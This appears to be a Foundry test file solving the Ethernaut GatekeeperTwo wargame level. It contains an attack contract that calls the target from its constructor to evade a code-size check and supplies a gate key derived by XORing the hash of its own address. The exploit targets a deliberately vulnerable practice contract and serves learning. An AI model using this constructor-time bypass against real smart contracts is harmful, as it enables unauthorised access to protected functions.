// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {GatekeeperTwo} from "../../src/ethernaut/14_GatekeeperTwo.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo public gatekeeperTwo;
    GatekeeperTwoAttack public gatekeeperTwoAttack;

    address public attacker = address(1);

    function setUp() public {
        gatekeeperTwo = new GatekeeperTwo();
    }

    function test() public {
        vm.startPrank(attacker);
        gatekeeperTwoAttack = new GatekeeperTwoAttack(gatekeeperTwo);
        vm.stopPrank();
        console2.log(gatekeeperTwo.entrant());
        console2.log(type(uint64).max);
        bytes8 testGateKey = bytes8(
            keccak256(abi.encodePacked(address(gatekeeperTwoAttack)))
        ) ^ 0xffffffffffffffff;
        console2.log(uint64(testGateKey));
        console2.log(
            uint64(
                bytes8(
                    keccak256(abi.encodePacked(address(gatekeeperTwoAttack)))
                )
            ) ^ uint64(testGateKey)
        );
    }
}

contract GatekeeperTwoAttack {
    GatekeeperTwo public gatekeeperTwo;
    bytes8 public _gateKey;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        _gateKey =
            bytes8(keccak256(abi.encodePacked(address(this)))) ^
            0xffffffffffffffff;
        gatekeeperTwo = _gatekeeperTwo;
        (bool success, ) = address(gatekeeperTwo).call(
            abi.encodeWithSignature("enter(bytes8)", _gateKey)
        );
    }

    function attack() public {}
}
